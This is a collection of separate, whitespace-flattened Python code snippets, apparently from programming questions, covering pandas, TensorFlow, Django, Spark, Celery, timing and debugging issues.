"df = pd.DataFrame ( { 'Last_Name ' : [ 'Smith ' , None , 'Brown ' ] , 'Date0 ' : [ '01/01/1999 ' , '01/06/1999 ' , '01/01/1979 ' ] , 'Age0 ' : [ 29,44,21 ] , 'Date1 ' : [ '08/01/1999 ' , '07/01/2014 ' , '01/01/2016 ' ] , 'Age1 ' : [ 35 , 45 , 47 ] , 'Date2 ' : [ None , '01/06/2035 ' , '08/01/1979 ' ] , 'Age2 ' : [ 47 , None , 74 ] , 'Last_age ' : [ 47,45,74 ] } ) df = pd.DataFrame ( { 'Last_Name ' : [ 'Smith ' , None , 'Brown ' ] , 'Date0 ' : [ '01/01/1999 ' , '01/06/1999 ' , '01/01/1979 ' ] , 'Age0 ' : [ 29,44,21 ] , 'Date1 ' : [ '08/01/1999 ' , '07/01/2014 ' , '01/01/2016 ' ] , 'Age1 ' : [ 35 , 45 , 47 ] , 'Date2 ' : [ None , '01/06/2035 ' , '08/01/1979 ' ] , 'Age2 ' : [ 47 , None , 74 ] , 'Last_age ' : [ 47,45,74 ] , 'Last_age_date ' : [ 'Error no date ' , '07/01/2014 ' , '08/01/1979 ' ] } )"
"start_time = time.time ( ) # loops and code and stuff for tick thread in here ... time_lapsed = time.time ( ) - start_time # get the time it took to run the above codeif 0.1 - time_lapsed > 0 : time.sleep ( 0.1 - time_lapsed ) else : print `` Server is overloaded ! '' # server lag is greater that .1 , so do n't sleep , and just eat it on this run . # the goal is to never see this ."
setup.pysrc Pure Python Moduleskeleton example __init__.py resources static error.css example.css logo_shadow.png template error.html example.html server.tmplt
"regions = { 'US ' : `` , # USA is the default server 'Australia ' : # json response through the api , 'Canada ' : # json response through the api , 'France ' : # json response through the api , 'Germany ' : # json response through the api , 'UK ' : # json request response the api } for region in regions : fp = webdriver.FirefoxProfile ( ) if ( regions [ region ] ! = `` ) : fp.set_preference ( `` network.proxy.type '' , 1 ) fp.set_preference ( `` network.proxy.socks '' , regions [ region ] ) fp.set_preference ( `` network.proxy.socks_port '' , port )"
"import tensorflow as tfimport numpy as npimport timeSIZE = 5000inp = tf.keras.layers.Input ( shape= ( SIZE , ) , dtype='float32 ' ) x = tf.keras.layers.Dense ( units=SIZE ) ( inp ) model = tf.keras.Model ( inputs=inp , outputs=x ) np_data = np.random.rand ( 1 , SIZE ) ds = tf.data.Dataset.from_tensor_slices ( np_data ) .batch ( 1 ) .repeat ( ) debug_time = time.time ( ) while True : model.predict ( x=ds , steps=1 ) print ( 'Processing { : .2f } '.format ( time.time ( ) - debug_time ) ) debug_time = time.time ( ) import tensorflow as tfimport numpy as npimport timeSIZE = 5000inp = tf.keras.layers.Input ( shape= ( SIZE , ) , dtype='float32 ' ) x = tf.keras.layers.Dense ( units=SIZE ) ( inp ) model = tf.keras.Model ( inputs=inp , outputs=x ) np_data = np.random.rand ( 1 , SIZE ) debug_time = time.time ( ) while True : model.predict ( x=np_data ) # using numpy array directly print ( 'Processing { : .2f } '.format ( time.time ( ) - debug_time ) ) debug_time = time.time ( )"
"ranges = [ ( 1 , 50 ) , ( 49 , 70 ) , ( 75 , 85 ) , ( 84 , 88 ) , ( 87 , 92 ) ] [ ( 1 , 70 ) , ( 75 , 92 ) ] def overlap ( x , y ) : return range ( max ( x [ 0 ] , y [ 0 ] ) , min ( x [ -1 ] , y [ -1 ] ) + 1 ) ranges = [ ( 1 , 50 ) , ( 49 , 70 ) , ( 75 , 85 ) , ( 84 , 88 ) , ( 87 , 92 ) ] beg , end = min ( [ x [ 0 ] for x in ranges ] ) , 0for i in ranges : if i [ 0 ] == beg : end = i [ 1 ] while beg : for _ in ranges : for i in ranges : if i [ 1 ] > end and overlap ( i , [ beg , end ] ) : end = i [ 1 ] print ( beg , end ) try : beg = min ( [ x [ 0 ] for x in ranges if x [ 0 ] > end ] ) for i in ranges : if i [ 0 ] == beg : end = i [ 1 ] except ValueError : beg = None 1 7075 92"
"try : user = User.objects.get ( email=email ) except DoesNotExist : user = User ( ) if request.GET.get ( 'email ' , '' ) is not None : email = request.GET [ 'email ' ] )"
"select a.var1 , a.var2 , b.var1 , b.var2from tablea a , tableb bwhere a.var1=b.var1 and a.var2=b.var2and a.var3 < > b.var3 df = pd.merge ( a , b , on= [ 'VAR1 ' , 'VAR2 ' ] , how='inner ' ) and a.var3 < > b.var3"
"pipein = open ( pipe_name , ' r ' ) while program.KeepRunning : action = pipein.readline ( ) [ : -1 ] program.processLine ( line ) time.sleep ( 1 ) command = `` enable '' pipeout = os.open ( pipe_name , os.O_WRONLY ) os.write ( pipeout , command ) os.write ( pipeout , `` \n '' )"
res = [ ] while q.qsize > 0 : res.append ( q.get ( ) ) res = [ ] while True : try : res.append ( q.get ( block=False ) ) except Queue.Empty : break
"# ! /usr/bin/pythondef sumtil ( i ) : '' '' '' Recursive function to sum all numbers from 1 through i '' '' '' # Base case , the sum of all numbers from 1 through 1 is 1 ... if i == 1 : return 1 else : return i+sumtil ( i-1 ) # This will not throw an exceptionsumtil ( 998 ) # This will throw an exceptionsumtil ( 999 ) # ! /usr/bin/pythonimport functools @ functools.lru_cache ( maxsize=128 ) def sumtil ( i ) : `` '' '' Recursive function to sum all numbers from 1 through i '' '' '' # Base case , the sum of all numbers from 1 through 1 is 1 ... if i == 1 : return 1 else : return i+sumtil ( i-1 ) # This will not throw an exceptionsumtil ( 332 ) # This will throw an exceptionsumtil ( 333 )"
regexString = ' ( ? < = = `` ) '+original+ ' ( ? = '' ) ' original = 'This is a wonderland : ) ' original = 'This is a wonderland : \\ ) '
"Python 2.6.2 ( r262:71600 , May 31 2009 , 03:55:41 ) [ GCC 3.3.4 ] on linux2Type `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > .11251938906.2350719 > > > .10.23507189750671387 > > > .10.0 > > > .1-1073741823.0 > > > .1-1073741823.0 > > > .1-1073741823.0 > > >"
def decorate ( fn ) : def wrapped ( ) : return `` scriptname : `` + fn.scriptname ? return wrapped
project| main.py| test1.py| test2.py| config.py import config as confimport test1import test2print ( conf.test_var ) test1.test1 ( ) print ( conf.test_var ) test2.test2 ( ) import config as confdef test1 ( ) : conf.test_var = 'test1 ' import config as confdef test2 ( ) : print ( conf.test_var ) test_var = 'initial_value ' initial_valuetest1test1
"def LSTModel ( input_shape , word_to_vec_map , word_to_index ) : sentence_indices = Input ( input_shape , dtype= '' int32 '' ) embedding_layer = pretrained_embedding_layer ( word_to_vec_map , word_to_index ) embeddings = embedding_layer ( sentence_indices ) X = LSTM ( 256 , return_sequences=True ) ( embeddings ) X = Dropout ( 0.5 ) ( X ) X = LSTM ( 256 , return_sequences=False ) ( X ) X = Dropout ( 0.5 ) ( X ) X = Dense ( NUM_OF_LABELS ) ( X ) X = Activation ( `` softmax '' ) ( X ) model = Model ( inputs=sentence_indices , outputs=X ) return model"
"class ToBeDeleted : def __init__ ( self , value ) : self.value = val # Whatever ... def __del__ ( self ) : print self.valuel = [ ToBeDeleted ( i ) for i in range ( 3 ) ] del l"
@ self.bp.route ( '/logout ' ) def logout ( ) : session [ 'mwo_token ' ] = None session [ 'username ' ] = None if 'next ' in request.args : return redirect ( request.args [ 'next ' ] ) return `` Logged out ! ''
A | B | B_new -- -- | -- -- | -- -- -- -- -1 | 1 | 11 | 2 | 1.51 | 3 | 2.252 | 2 | 22 | 4 | 32 | 6 | 4.5 $ $ new = C*cur+ ( 1-C ) *old $ $
"class CourseUpdateView ( UpdateView ) : def dispatch ( self , request , *args , **kwargs ) : self.request = request self.kwargs = kwargs self.object = self.get_object ( ) if self.object.is_online : messages.warning ( request , `` Sorry this one ca n't be updated '' ) return redirect ( `` course : detail '' , pk=self.kwargs [ 'pk ' ] ) # this is going to call self.get_object again is n't it ? return UpdateView.dispatch ( self , request , *args , **kwargs )"
"# Configurationconf = pyspark.SparkConf ( ) conf.set ( `` spark.hadoop.fs.s3a.aws.credentials.provider '' , `` org.apache.hadoop.fs.s3a.AnonymousAWSCredentialsProvider '' ) conf.set ( `` spark.executor.instances '' , `` 4 '' ) conf.set ( `` spark.executor.cores '' , `` 8 '' ) sc = pyspark.SparkContext ( conf=conf ) # 960 Files from a public dataset in 2 batchesinput_files = `` s3a : //commoncrawl/crawl-data/CC-MAIN-2019-35/segments/1566027312025.20/warc/CC-MAIN-20190817203056-20190817225056-00 [ 0-5 ] * '' input_files2 = `` s3a : //commoncrawl/crawl-data/CC-MAIN-2019-35/segments/1566027312128.3/warc/CC-MAIN-20190817102624-20190817124624-00 [ 0-3 ] * '' # Count occurances of a certain stringlogData = sc.textFile ( input_files ) logData2 = sc.textFile ( input_files2 ) a = logData.filter ( lambda value : value.startswith ( 'WARC-Type : response ' ) ) .count ( ) b = logData2.filter ( lambda value : value.startswith ( 'WARC-Type : response ' ) ) .count ( ) print ( a , b ) // Configurationconfig.set ( `` spark.executor.instances '' , `` 4 '' ) config.set ( `` spark.executor.cores '' , `` 8 '' ) val sc = new SparkContext ( config ) sc.setLogLevel ( `` WARN '' ) sc.hadoopConfiguration.set ( `` fs.s3a.aws.credentials.provider '' , `` org.apache.hadoop.fs.s3a.AnonymousAWSCredentialsProvider '' ) // 960 Files from a public dataset in 2 batches val input_files = `` s3a : //commoncrawl/crawl-data/CC-MAIN-2019-35/segments/1566027312025.20/warc/CC-MAIN-20190817203056-20190817225056-00 [ 0-5 ] * '' val input_files2 = `` s3a : //commoncrawl/crawl-data/CC-MAIN-2019-35/segments/1566027312128.3/warc/CC-MAIN-20190817102624-20190817124624-00 [ 0-3 ] * '' // Count occurances of a certain stringval logData1 = sc.textFile ( input_files ) val logData2 = sc.textFile ( input_files2 ) val num1 = logData1.filter ( line = > line.startsWith ( `` WARC-Type : response '' ) ) .count ( ) val num2 = logData2.filter ( line = > line.startsWith ( `` WARC-Type : response '' ) ) .count ( ) println ( s '' Lines with a : $ num1 , Lines with b : $ num2 '' )"
import numba @ numba.jitdef foo ( x ) : return x**2 @ numba.jitdef bar ( x ) : return 4 * foo ( x ) # this will be a fast function call cpdef double foo ( double x ) : return x**2 import numbaimport foo @ numba.jitdef bar ( x ) : return 4 * foo.foo ( x ) # will this be a fast function call ?
"server_ext/|__ __init__.py|__ extension.py from notebook.utils import url_path_joinfrom notebook.base.handlers import IPythonHandlerclass HelloWorldHandler ( IPythonHandler ) : def get ( self ) : self.finish ( 'Hello , world ! ' ) def load_jupyter_server_extension ( nbapp ) : `` '' '' nbapp is istance of Jupyter.notebook.notebookapp.NotebookApp nbapp.web_app is isntance of tornado.web.Application - can register new tornado.web.RequestHandlers to extend API backend. `` '' '' nbapp.log.info ( 'My Extension Loaded ' ) web_app = nbapp.web_app host_pattern = ' . * $ ' route_pattern = url_path_join ( web_app.settings [ 'base_url ' ] , '/hello ' ) web_app.add_handlers ( host_pattern , [ ( route_pattern , HelloWorldHandler ) ] ) jupyter notebook -- NotebookApp.server_extensions= '' [ 'server_ext.extension ' ] ''"
"class CeleryConfig ( object ) : BROKER_URL = 'sqla+postgresql : //superset : superset @ db:5432/superset ' CELERY_IMPORTS = ( 'superset.sql_lab ' , 'superset.tasks ' , ) CELERY_RESULT_BACKEND = 'db+postgresql : //superset : superset @ db:5432/superset ' CELERYD_LOG_LEVEL = 'DEBUG ' CELERYD_PREFETCH_MULTIPLIER = 10 CELERY_ACKS_LATE = True CELERY_ANNOTATIONS = { 'sql_lab.get_sql_results ' : { 'rate_limit ' : '100/s ' , } , 'email_reports.send ' : { 'rate_limit ' : ' 1/s ' , 'time_limit ' : 120 , 'soft_time_limit ' : 150 , 'ignore_result ' : True , } , } CELERYBEAT_SCHEDULE = { 'email_reports.schedule_hourly ' : { 'task ' : 'email_reports.schedule_hourly ' , 'schedule ' : crontab ( minute=1 , hour='* ' ) , } , } celery worker -- app=superset.tasks.celery_app : app -- pool=prefork -O fair -c 4celery beat -- app=superset.tasks.celery_app : app superset-worker : build : *superset-build command : > sh -c `` celery worker -- app=superset.tasks.celery_app : app -Ofair -f /app/celery_worker.log & & celery beat -- app=superset.tasks.celery_app : app -f /app/celery_beat.log '' env_file : docker/.env restart : unless-stopped depends_on : *superset-depends-on volumes : *superset-volumes"
"pyinstaller gui.py File `` /Users/username/anaconda/bin/PyInstaller '' , line 11 , in < module > sys.exit ( run ( ) ) File `` /Users/username/anaconda/lib/python2.7/site-packages/PyInstaller/__main__.py '' , line 90 , in runrun_build ( pyi_config , spec_file , **vars ( args ) ) File `` /Users/username/anaconda/lib/python2.7/site-packages/PyInstaller/__main__.py '' , line 46 , in run_buildPyInstaller.building.build_main.main ( pyi_config , spec_file , **kwargs ) File `` /Users/username/anaconda/lib/python2.7/site-packages/PyInstaller/building/build_main.py '' , line 788 , in mainbuild ( specfile , kw.get ( 'distpath ' ) , kw.get ( 'workpath ' ) , kw.get ( 'clean_build ' ) ) File `` /Users/username/anaconda/lib/python2.7/site-packages/PyInstaller/building/build_main.py '' , line 734 , in buildexec ( text , spec_namespace ) File `` < string > '' , line 16 , in < module > File `` /Users/username/anaconda/lib/python2.7/site-packages/PyInstaller/building/build_main.py '' , line 212 , in __init__self.__postinit__ ( ) File `` /Users/username/anaconda/lib/python2.7/site-packages/PyInstaller/building/datastruct.py '' , line 178 , in __postinit__self.assemble ( ) File `` /Users/username/anaconda/lib/python2.7/site-packages/PyInstaller/building/build_main.py '' , line 470 , in assemblemodule_hook.post_graph ( ) File `` /Users/username/anaconda/lib/python2.7/site-packages/PyInstaller/building/imphook.py '' , line 409 , in post_graphself._load_hook_module ( ) File `` /Users/username/anaconda/lib/python2.7/site-packages/PyInstaller/building/imphook.py '' , line 376 , in _load_hook_moduleself.hook_module_name , self.hook_filename ) File `` /Users/username/anaconda/lib/python2.7/site-packages/PyInstaller/hooks/hook-PyQt4.py '' , line 33 , in < module > ( qt_menu_nib_dir ( 'PyQt4 ' ) , `` ) , File `` /Users/username/anaconda/lib/python2.7/site-packages/PyInstaller/utils/hooks/qt.py '' , line 125 , in qt_menu_nib_dir '' '' '' .format ( namespace , path ) ) Exception : Can not find qt_menu.nib for PyQt4 Path checked : /Users/felipe/miniconda/envs/_build/lib/QtGui.framework/Resources/qt_menu.nib"
import ctypeslib1 = ctypes.cdll.LoadLibrary ( `` ./mylib.so '' ) # modify mylib.so ( code generation and compilation ) or even delete itlib2 = ctypes.cdll.LoadLibrary ( `` ./mylib.so '' )
"gemfile '../Gemfile ' , 'common ' , 'worker ' # merges gems from common and worker groups # here we have to include hoover library with worker.hoover_dir = os.path.dirname ( hoover.__file__ ) shutil.copytree ( hoover_dir , worker_dir + '/loggly ' ) # copy it to worker directory"
"cart = [ ( ( p , pp ) , ( q , qq ) ) for ( ( p , pp ) , ( q , qq ) ) \ in itertools.product ( C.items ( ) , repeat=2 ) \ if p [ 1 : ] == q [ : -1 ] ] C = { ( 0,1 ) : ' b ' , ( 2,0 ) : ' c ' , ( 0,0 ) : 'd ' } cart = [ ( ( ( 2 , 0 ) , ' c ' ) , ( ( 0 , 1 ) , ' b ' ) ) ( ( ( 2 , 0 ) , ' c ' ) , ( ( 0 , 0 ) , 'd ' ) ) ( ( ( 0 , 0 ) , 'd ' ) , ( ( 0 , 1 ) , ' b ' ) ) ( ( ( 0 , 0 ) , 'd ' ) , ( ( 0 , 0 ) , 'd ' ) ) ] aa = defaultdict ( list ) bb = defaultdict ( list ) [ aa [ p [ 1 : ] ] .append ( p ) for p in C.keys ( ) ] [ bb [ p [ : -1 ] ] .append ( p ) for p in C.keys ( ) ]"
"( py34 ) [ bob @ bob anaconda ] $ conda install bokehFetching package metadata : ... .Solving package specifications : .Package plan for installation in environment /home/bob/anaconda/envs/py34 : The following packages will be downloaded : package | build -- -- -- -- -- -- -- -- -- -- -- -- -- -| -- -- -- -- -- -- -- -- -numpy-1.9.3 | py34_0 5.7 MBpytz-2015.6 | py34_0 173 KBsetuptools-18.3.2 | py34_0 346 KBtornado-4.2.1 | py34_0 557 KBwheel-0.26.0 | py34_1 77 KBjinja2-2.8 | py34_0 301 KBbokeh-0.10.0 | py34_0 3.9 MB -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Total : 10.9 MBThe following NEW packages will be INSTALLED : libgfortran : 1.0-0 openblas : 0.2.14-3 wheel : 0.26.0-py34_1The following packages will be UPDATED : bokeh : 0.9.0-np19py34_0 -- > 0.10.0-py34_0jinja2 : 2.7.3-py34_1 -- > 2.8-py34_0 numpy : 1.9.2-py34_0 -- > 1.9.3-py34_0 pip : 7.0.3-py34_0 -- > 7.1.2-py34_0 pytz : 2015.4-py34_0 -- > 2015.6-py34_0setuptools : 17.1.1-py34_0 -- > 18.3.2-py34_0tornado : 4.2-py34_0 -- > 4.2.1-py34_0 Proceed ( [ y ] /n ) ? yFetching packages ... numpy-1.9.3-py 100 % | # # # # # # # # # # # # # # # # # # # # # # # # # # | Time : 0:00:00 6.21 MB/spytz-2015.6-py 100 % | # # # # # # # # # # # # # # # # # # # # # # # # # # | Time : 0:00:00 1.44 MB/ssetuptools-18 . 100 % | # # # # # # # # # # # # # # # # # # # # # # # # # # | Time : 0:00:00 2.63 MB/stornado-4.2.1- 100 % | # # # # # # # # # # # # # # # # # # # # # # # # # # | Time : 0:00:00 3.57 MB/swheel-0.26.0-p 100 % | # # # # # # # # # # # # # # # # # # # # # # # # # # | Time : 0:00:00 1.28 MB/sjinja2-2.8-py3 100 % | # # # # # # # # # # # # # # # # # # # # # # # # # # | Time : 0:00:00 2.19 MB/sbokeh-0.10.0-p 100 % | # # # # # # # # # # # # # # # # # # # # # # # # # # | Time : 0:00:00 5.74 MB/s Extracting packages ... [ COMPLETE ] | # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # | 100 % Unlinking packages ... [ COMPLETE ] | # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # | 100 % Linking packages ... [ COMPLETE ] | # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # | 100 % ( py34 ) [ bob @ bob anaconda ] $ python bokeh.pyTraceback ( most recent call last ) : File `` bokeh.py '' , line 1 , in < module > from bokeh import plotting File `` /home/bob/anaconda/bokeh.py '' , line 1 , in < module > from bokeh import plotting ImportError : can not import name 'plotting '"
"class A ( object ) : def __init__ ( self , foo , bar ) : pass def func1 ( self ) : op1 ( ) op2 ( ) def func2 ( self ) : pass class B ( A ) : def func2 ( self ) : # do something def func1 ( self ) : op3 ( )"
"setup_string = 'import numpy as np ; \ N=int ( 1e5 ) ; \ x=np.arange ( 1 , N+1 , dtype=int ) ; \ y=np.arange ( N , dtype=int ) ; ' timeit ( `` x+y '' , setup=setup_string , number=int ( 1e3 ) ) 0.09872294100932777 timeit ( `` x-y '' , setup=setup_string , number=int ( 1e3 ) ) 0.09425603999989107 timeit ( `` x*y '' , setup=setup_string , number=int ( 1e3 ) ) 0.09888673899695277 timeit ( `` x/y '' , setup=setup_string , number=int ( 1e3 ) ) 0.3574664070038125 timeit ( `` x//y '' , setup=setup_string , number=int ( 1e3 ) ) 1.006298642983893"
index = [ i+1 for i in range ( 365 ) ] # n could be 3for i in range ( n ) : exclusion_regions.append ( get_random_contiguous_region ( index ) )
ipdb.set_trace ( ) import ipdb ; ipdb.set_trace ( )
"from sklearn.linear_model import RidgeCVfrom sklearn.datasets import load_bostonboston = load_boston ( ) mod = RidgeCV ( store_cv_values = True , scoring = 'r2 ' ) fit = mod.fit ( boston.data , boston.target ) print ( fit ) print ( fit.cv_values_ ) mod = RidgeCV ( store_cv_values = True , scoring = 'neg_mean_squared_error ' ) fit = mod.fit ( boston.data , boston.target ) print ( fit ) print ( fit.cv_values_ ) RidgeCV ( alphas= ( 0.1 , 1.0 , 10.0 ) , cv=None , fit_intercept=True , gcv_mode=None , normalize=False , scoring='r2 ' , store_cv_values=True ) [ [ 7.61705436 7.83092421 8.2298466 ] [ 2.50029583 2.31181064 2.11665248 ] [ 7.98280614 7.95286299 7.87166914 ] ... , [ 5.24271689 5.50191347 5.84802692 ] [ 3.7448827 4.01778493 4.40457956 ] [ 0.0859419 0.37219929 0.89447484 ] ] RidgeCV ( alphas= ( 0.1 , 1.0 , 10.0 ) , cv=None , fit_intercept=True , gcv_mode=None , normalize=False , scoring='neg_mean_squared_error ' , store_cv_values=True ) [ [ 7.61705436 7.83092421 8.2298466 ] [ 2.50029583 2.31181064 2.11665248 ] [ 7.98280614 7.95286299 7.87166914 ] ... , [ 5.24271689 5.50191347 5.84802692 ] [ 3.7448827 4.01778493 4.40457956 ] [ 0.0859419 0.37219929 0.89447484 ] ]"
"In [ 209 ] : % timeit -n 100000 -r 100 np.power ( 3.71242 , 7 ) 100000 loops , best of 100 : 3.45 µs per loopIn [ 210 ] : % timeit -n 100000 -r 100 np.power ( 3.71242 , 7.0 ) 100000 loops , best of 100 : 1.98 µs per loop"
"curl -X PUT -d ' [ { `` foo '' : '' more_foo '' } ] ' http : //ip:6001/whatever ? api_key=whatever import requestsurl = 'http : //ip:6001/whatever ? api_key=whatever ' a = requests.put ( url , data= { `` foo '' : '' more_foo '' } ) print ( a.text ) print ( a.status_code )"
"-- -- -- -- -- -- -- |A|B|C| -- -- -- -- -- -- -- |1|2|3| -- -- -- -- -- -- -- |4|5|6| -- -- -- -- -- -- -- |7|8|9| -- -- -- -- -- -- -- pd.read_csv ( `` sample.csv '' , sep= '' | '' )"
"rs = pd.Series ( range ( 10 ) ) rs.rolling ( window = 3 ) # print 's Rolling [ window=3 , center=False , axis=0 ] [ 0,1,2 ] [ 1,2,3 ] [ 2,3,4 ]"
"def decoding_layer_train ( encoder_state , dec_cell , dec_embed_input , target_sequence_length , max_summary_length , output_layer , keep_prob ) : '' '' '' Create a decoding layer for training : param encoder_state : Encoder State : param dec_cell : Decoder RNN Cell : param dec_embed_input : Decoder embedded input : param target_sequence_length : The lengths of each sequence in the target batch : param max_summary_length : The length of the longest sequence in the batch : param output_layer : Function to apply the output layer : param keep_prob : Dropout keep probability : return : BasicDecoderOutput containing training logits and sample_id '' '' '' training_helper = tf.contrib.seq2seq.TrainingHelper ( inputs=dec_embed_input , sequence_length=target_sequence_length , time_major=False ) training_decoder = tf.contrib.seq2seq.BasicDecoder ( dec_cell , training_helper , encoder_state , output_layer ) training_decoder_output = tf.contrib.seq2seq.dynamic_decode ( training_decoder , impute_finished=True , maximum_iterations=max_summary_length ) [ 0 ] return training_decoder_output def decoding_layer_train ( encoder_state , dec_cell , dec_embeddings , target_sequence_length , max_summary_length , output_layer , keep_prob ) : `` '' '' Create a decoding layer for training : param encoder_state : Encoder State : param dec_cell : Decoder RNN Cell : param dec_embed_input : Decoder embedded input : param target_sequence_length : The lengths of each sequence in the target batch : param max_summary_length : The length of the longest sequence in the batch : param output_layer : Function to apply the output layer : param keep_prob : Dropout keep probability : return : BasicDecoderOutput containing training logits and sample_id `` '' '' start_tokens = tf.tile ( tf.constant ( [ target_vocab_to_int [ ' < GO > ' ] ] , dtype=tf.int32 ) , [ batch_size ] , name='start_tokens ' ) training_helper = tf.contrib.seq2seq.GreedyEmbeddingHelper ( dec_embeddings , start_tokens , target_vocab_to_int [ ' < EOS > ' ] ) training_decoder = tf.contrib.seq2seq.BasicDecoder ( dec_cell , training_helper , encoder_state , output_layer ) training_decoder_output = tf.contrib.seq2seq.dynamic_decode ( training_decoder , impute_finished=True , maximum_iterations=max_summary_length ) [ 0 ] return training_decoder_output OkEpoch 0 Batch 5/91 - Train Accuracy : 0.4347 , Validation Accuracy : 0.3557 , Loss : 2.8656++++Epoch 0 Batch 5/91 - Train WER : 1.0000 , Validation WER : 1.0000Epoch 0 Batch 10/91 - Train Accuracy : 0.4050 , Validation Accuracy : 0.3864 , Loss : 2.6347++++Epoch 0 Batch 10/91 - Train WER : 1.0000 , Validation WER : 1.0000 -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -InvalidArgumentError Traceback ( most recent call last ) < ipython-input-115-1d2a9495ad42 > in < module > ( ) 57 target_sequence_length : targets_lengths , 58 source_sequence_length : sources_lengths , -- - > 59 keep_prob : keep_probability } ) 60 61 /Users/alsulaimi/Documents/AI/Tensorflow-make/workspace/lib/python2.7/site-packages/tensorflow/python/client/session.pyc in run ( self , fetches , feed_dict , options , run_metadata ) 887 try : 888 result = self._run ( None , fetches , feed_dict , options_ptr , -- > 889 run_metadata_ptr ) 890 if run_metadata : 891 proto_data = tf_session.TF_GetBuffer ( run_metadata_ptr ) /Users/alsulaimi/Documents/AI/Tensorflow-make/workspace/lib/python2.7/site-packages/tensorflow/python/client/session.pyc in _run ( self , handle , fetches , feed_dict , options , run_metadata ) 1116 if final_fetches or final_targets or ( handle and feed_dict_tensor ) : 1117 results = self._do_run ( handle , final_targets , final_fetches , - > 1118 feed_dict_tensor , options , run_metadata ) 1119 else : 1120 results = [ ] /Users/alsulaimi/Documents/AI/Tensorflow-make/workspace/lib/python2.7/site-packages/tensorflow/python/client/session.pyc in _do_run ( self , handle , target_list , fetch_list , feed_dict , options , run_metadata ) 1313 if handle is None : 1314 return self._do_call ( _run_fn , self._session , feeds , fetches , targets , - > 1315 options , run_metadata ) 1316 else : 1317 return self._do_call ( _prun_fn , self._session , handle , feeds , fetches ) /Users/alsulaimi/Documents/AI/Tensorflow-make/workspace/lib/python2.7/site-packages/tensorflow/python/client/session.pyc in _do_call ( self , fn , *args ) 1332 except KeyError : 1333 pass- > 1334 raise type ( e ) ( node_def , op , message ) 1335 1336 def _extend_graph ( self ) : InvalidArgumentError : logits and labels must have the same first dimension , got logits shape [ 1100,78 ] and labels shape [ 1400 ]"
"import mockMOCK_MODULES = [ 'numpy ' , 'scipy ' ] for mod_name in MOCK_MODULES : sys.modules [ mod_name ] = mock.Mock ( )"
"install : rm -f ../../lib/python2.6/site-packages/myproject.pth cp myproject.pth ../../lib/python2.6/site-packages/myproject.pth from setuptools import setupsetup ( packages= [ 'mypackage_pth ' ] , package_dir= { 'mypackage_pth ' : ' . ' } , package_data= { 'mypackage_pth ' : [ 'mypackage.pth ' ] } , )"
"from functools import wrapsimport errnoimport osimport signalclass TimeoutError ( Exception ) : passdef timeout ( seconds=100 , error_message=os.strerror ( errno.ETIME ) ) : def decorator ( func ) : def _handle_timeout ( signum , frame ) : raise TimeoutError ( error_message ) def wrapper ( *args , **kwargs ) : signal.signal ( signal.SIGALRM , _handle_timeout ) signal.alarm ( seconds ) try : result = func ( *args , **kwargs ) finally : signal.alarm ( 0 ) return result return wraps ( func ) ( wrapper ) return decorator"
"import sysfrom PySide.QtCore import *from PySide.QtGui import *from PySide.QtWebKit import *app = QApplication ( sys.argv ) web = QWebView ( ) web.settings ( ) .setAttribute ( QWebSettings.WebAttribute.DeveloperExtrasEnabled , True ) # or globally : # QWebSettings.globalSettings ( ) .setAttribute ( # QWebSettings.WebAttribute.DeveloperExtrasEnabled , True ) web.load ( QUrl ( `` http : //www.google.com '' ) ) web.show ( ) inspect = QWebInspector ( ) inspect.setPage ( web.page ( ) ) inspect.show ( ) sys.exit ( app.exec_ ( ) )"
import timeimport matplotlib.pyplot as plttime_arr = [ ] for i in range ( 5000 ) : t0 = time.time ( ) print `` K '' t1 = time.time ( ) - t0 time_arr.append ( t1 ) plt.plot ( time_arr ) plt.show ( )
"import datetime date_value = 41381.0 date_conv= datetime.date ( 1900 , 1 , 1 ) + datetime.timedelta ( int ( date_value ) ) print date_conv date_conv = 2013-04-19"
"solution = `` '' def parentheses ( n ) : global solution if n == 0 : print solution return for i in range ( 1 , n+1 ) : start_index = len ( solution ) solution = solution + ( `` ( `` * i + `` ) '' * i ) parentheses ( n - i ) solution = solution [ : start_index ] if __name__ == `` __main__ '' : n = int ( raw_input ( `` Enter the number of parentheses : '' ) ) print `` The possible ways to print these parentheses are ... . '' parentheses ( n )"
"import click @ click.command ( name='foo ' ) @ click.option ( ' -- bar ' , required=True ) def do_something ( bar ) : print ( bar ) TypeError : do_something ( ) got an unexpected keyword argument 'id '"
"e [ `` createdOn '' ] = e [ `` createdOn '' ] / 1000.0 SELECT updatedOn , TIMESTAMP_TO_USEC ( updatedOn ) FROM [ table.sessions ] WHERE session = xxxxxxxRow updatedOn f0_ 1 2014-08-18 11:55:49 UTC 14083629494260002 2014-08-18 11:55:49 UTC 1408362949426000 { u'session ' : 100000000000080736 , u'user ' : 1000000000075756 , u'updatedOn ' : 1409052076.223 }"
"python -m timeit -s `` L = xrange ( 1000000 ) '' `` sum ( [ 1 for i in L if i & 1 ] ) '' 10 loops , best of 3 : 109 msec per looppython -m timeit -s `` L = xrange ( 1000000 ) '' `` sum ( 1 for i in L if i & 1 ) '' 10 loops , best of 3 : 125 msec per loop"
"import osimport randomimport numpy as npprint ( 'PYTHON HASH SEED IS ' , os.environ [ 'PYTHONHASHSEED ' ] ) random.seed ( 1 ) np.random.seed ( 2 ) class S : def __init__ ( self , a , b ) : self.a = a self.b = b def __repr__ ( self ) : return `` '' .join ( [ type ( self ) .__name__ , `` _ { 0.a ! r } _ '' , `` School '' , `` _ { 0.b ! r } '' ] ) .format ( self ) list1 = np.random.randint ( 1 , 100 , size=40 ) list2 = np.random.randint ( 1 , 10 , size=40 ) d1 = dict ( ) s1 = set ( ) d1 [ 'students ' ] = s1 # assign students to d1for s_id , sch_id in zip ( list1 , list2 ) : d1 [ 'students ' ] .add ( S ( s_id , sch_id ) ) print ( s1 )"
